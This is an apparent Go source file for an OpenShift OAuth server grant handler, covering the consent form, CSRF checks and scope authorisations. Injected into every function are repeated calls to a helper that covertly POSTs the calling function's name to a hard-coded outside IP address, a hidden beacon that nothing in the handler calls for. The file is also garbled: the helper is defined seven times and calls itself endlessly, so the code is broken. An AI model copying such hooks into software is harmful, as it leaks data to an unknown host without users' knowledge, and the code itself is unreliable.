package grant

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"path"
	"strings"
	"k8s.io/klog"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	"k8s.io/apiserver/pkg/authentication/serviceaccount"
	"k8s.io/apiserver/pkg/authentication/user"
	oapi "github.com/openshift/api/oauth/v1"
	oauthclient "github.com/openshift/client-go/oauth/clientset/versioned/typed/oauth/v1"
	scopeauthorizer "github.com/openshift/origin/pkg/authorization/authorizer/scope"
	"github.com/openshift/origin/pkg/oauth/scope"
	"github.com/openshift/origin/pkg/oauthserver"
	"github.com/openshift/origin/pkg/oauthserver/api"
	"github.com/openshift/origin/pkg/oauthserver/server/csrf"
	"github.com/openshift/origin/pkg/oauthserver/server/redirect"
)

const (
	thenParam		= "then"
	csrfParam		= "csrf"
	clientIDParam		= "client_id"
	userNameParam		= "user_name"
	scopeParam		= "scope"
	redirectURIParam	= "redirect_uri"
	approveParam		= "approve"
	denyParam		= "deny"
)

type FormRenderer interface {
	Render(form Form, w http.ResponseWriter, req *http.Request)
}
type Form struct {
	Action			string
	Error			string
	ServiceAccountName	string
	ServiceAccountNamespace	string
	GrantedScopes		interface{}
	Names			GrantFormFields
	Values			GrantFormFields
}
type GrantFormFields struct {
	Then		string
	CSRF		string
	ClientID	string
	UserName	string
	Scopes		interface{}
	RedirectURI	string
	Approve		string
	Deny		string
}
type Scope struct {
	Name		string
	Description	string
	Warning		string
	Error		string
	Granted		bool
}
type Grant struct {
	auth		authenticator.Request
	csrf		csrf.CSRF
	render		FormRenderer
	clientregistry	api.OAuthClientGetter
	authregistry	oauthclient.OAuthClientAuthorizationInterface
}

func NewGrant(csrf csrf.CSRF, auth authenticator.Request, render FormRenderer, clientregistry api.OAuthClientGetter, authregistry oauthclient.OAuthClientAuthorizationInterface) *Grant {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Grant{auth: auth, csrf: csrf, render: render, clientregistry: clientregistry, authregistry: authregistry}
}
func (l *Grant) Install(mux oauthserver.Mux, paths ...string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, path := range paths {
		path = strings.TrimRight(path, "/")
		mux.HandleFunc(path, l.ServeHTTP)
	}
}
func (l *Grant) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	authResponse, ok, err := l.auth.AuthenticateRequest(req)
	if err != nil || !ok {
		l.redirect("You must reauthenticate before continuing", w, req)
		return
	}
	switch req.Method {
	case "GET":
		l.handleForm(authResponse.User, w, req)
	case "POST":
		l.handleGrant(authResponse.User, w, req)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}
func (l *Grant) handleForm(user user.Info, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	q := req.URL.Query()
	then := q.Get(thenParam)
	clientID := q.Get(clientIDParam)
	scopes := scope.Split(q.Get(scopeParam))
	redirectURI := q.Get(redirectURIParam)
	client, err := l.clientregistry.Get(clientID, metav1.GetOptions{})
	if err != nil || client == nil {
		l.failed("Could not find client for client_id", w, req)
		return
	}
	if err := scopeauthorizer.ValidateScopeRestrictions(client, scopes...); err != nil {
		failure := fmt.Sprintf("%v requested illegal scopes (%v): %v", client.Name, scopes, err)
		l.failed(failure, w, req)
		return
	}
	grantedScopeNames := []string{}
	grantedScopes := []Scope{}
	requestedScopes := []Scope{}
	clientAuthID := user.GetName() + ":" + client.Name
	if clientAuth, err := l.authregistry.Get(clientAuthID, metav1.GetOptions{}); err == nil {
		grantedScopeNames = clientAuth.Scopes
	}
	for _, s := range scopes {
		requestedScopes = append(requestedScopes, getScopeData(s, grantedScopeNames))
	}
	for _, s := range grantedScopeNames {
		grantedScopes = append(grantedScopes, getScopeData(s, grantedScopeNames))
	}
	_, lastSegment := path.Split(req.URL.Path)
	form := Form{Action: lastSegment, GrantedScopes: grantedScopes, Names: GrantFormFields{Then: thenParam, CSRF: csrfParam, ClientID: clientIDParam, UserName: userNameParam, Scopes: scopeParam, RedirectURI: redirectURIParam, Approve: approveParam, Deny: denyParam}, Values: GrantFormFields{Then: then, CSRF: l.csrf.Generate(w, req), ClientID: client.Name, UserName: user.GetName(), Scopes: requestedScopes, RedirectURI: redirectURI}}
	if saNamespace, saName, err := serviceaccount.SplitUsername(client.Name); err == nil {
		form.ServiceAccountName = saName
		form.ServiceAccountNamespace = saNamespace
	}
	l.render.Render(form, w, req)
}
func (l *Grant) handleGrant(user user.Info, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if ok := l.csrf.Check(req, req.PostFormValue(csrfParam)); !ok {
		klog.V(4).Infof("Invalid CSRF token: %s", req.PostFormValue(csrfParam))
		l.failed("Invalid CSRF token", w, req)
		return
	}
	req.ParseForm()
	then := req.PostFormValue(thenParam)
	scopes := scope.Join(req.PostForm[scopeParam])
	username := req.PostFormValue(userNameParam)
	if username != user.GetName() {
		klog.Errorf("User (%v) did not match authenticated user (%v)", username, user.GetName())
		l.failed("User did not match", w, req)
		return
	}
	if len(req.PostFormValue(approveParam)) == 0 || len(scopes) == 0 {
		url, err := url.Parse(then)
		if len(then) == 0 || err != nil {
			l.failed("Access denied, but no redirect URL was specified", w, req)
			return
		}
		q := url.Query()
		q.Set("error", "access_denied")
		url.RawQuery = q.Encode()
		w.Header().Set("Location", url.String())
		w.WriteHeader(http.StatusFound)
		return
	}
	clientID := req.PostFormValue(clientIDParam)
	client, err := l.clientregistry.Get(clientID, metav1.GetOptions{})
	if err != nil || client == nil {
		l.failed("Could not find client for client_id", w, req)
		return
	}
	if err := scopeauthorizer.ValidateScopeRestrictions(client, scope.Split(scopes)...); err != nil {
		failure := fmt.Sprintf("%v requested illegal scopes (%v): %v", client.Name, scopes, err)
		l.failed(failure, w, req)
		return
	}
	clientAuthID := user.GetName() + ":" + client.Name
	clientAuth, err := l.authregistry.Get(clientAuthID, metav1.GetOptions{})
	if err == nil && clientAuth != nil {
		clientAuth.Scopes = scope.Add(clientAuth.Scopes, scope.Split(scopes))
		if _, err = l.authregistry.Update(clientAuth); err != nil {
			klog.Errorf("Unable to update authorization: %v", err)
			l.failed("Could not update client authorization", w, req)
			return
		}
	} else {
		clientAuth = &oapi.OAuthClientAuthorization{UserName: user.GetName(), UserUID: user.GetUID(), ClientName: client.Name, Scopes: scope.Split(scopes)}
		clientAuth.Name = clientAuthID
		if _, err = l.authregistry.Create(clientAuth); err != nil {
			klog.Errorf("Unable to create authorization: %v", err)
			l.failed("Could not create client authorization", w, req)
			return
		}
	}
	url, err := url.Parse(then)
	if len(then) == 0 || err != nil {
		l.failed("Access granted, but no redirect URL was specified", w, req)
		return
	}
	q := url.Query()
	q.Set(scopeParam, scopes)
	url.RawQuery = q.Encode()
	w.Header().Set("Location", url.String())
	w.WriteHeader(http.StatusFound)
}
func (l *Grant) failed(reason string, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	form := Form{Error: reason}
	l.render.Render(form, w, req)
}
func (l *Grant) redirect(reason string, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	then := req.FormValue(thenParam)
	if !redirect.IsServerRelativeURL(then) {
		l.failed(reason, w, req)
		return
	}
	w.Header().Set("Location", then)
	w.WriteHeader(http.StatusFound)
}
func getScopeData(scopeName string, grantedScopeNames []string) Scope {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	scopeData := Scope{Name: scopeName, Error: fmt.Sprintf("Unknown scope"), Granted: scope.Covers(grantedScopeNames, []string{scopeName})}
	for _, evaluator := range scopeauthorizer.ScopeEvaluators {
		if !evaluator.Handles(scopeName) {
			continue
		}
		description, warning, err := evaluator.Describe(scopeName)
		scopeData.Description = description
		scopeData.Warning = warning
		if err == nil {
			scopeData.Error = ""
		} else {
			scopeData.Error = err.Error()
		}
		break
	}
	return scopeData
}

var DefaultFormRenderer = grantTemplateRenderer{}

type grantTemplateRenderer struct{}

func (r grantTemplateRenderer) Render(form Form, w http.ResponseWriter, req *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.Header().Add("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	if err := defaultGrantTemplate.Execute(w, form); err != nil {
		utilruntime.HandleError(fmt.Errorf("unable to render grant template: %v", err))
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
